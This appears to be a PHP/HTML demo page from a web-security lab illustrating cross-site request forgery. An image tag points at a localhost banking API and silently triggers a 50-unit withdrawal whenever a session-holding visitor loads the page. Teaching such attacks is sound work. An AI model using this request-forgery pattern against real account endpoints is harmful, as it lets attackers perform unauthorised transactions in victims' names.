<?php

/*
* 
* 
*/

require_once "common.php";

session_start();

if ( !isset($_SESSION['money']) ) {
	$_SESSION['money'] = 300;
}

header('X-Frame-Options: deny');
//header('X-Frame-Options: SAMEORIGIN');
//header('X-Frame-Options: ALLOW-FROM https://localhost:2080/');

?>

<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>CSRF Hack Example</title>
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<link rel="stylesheet" href="css/main.css">

	<script type="text/javascript" src="js/jquery.min.js"></script>
	
</head>

<body>

<h1>Cross-Site Request Forgery Hacking Page</h1>

<div id="result">
<img src="http://localhost:2080/secure/api.php?type=2&withdraw=50">
</div>


</body>
</html>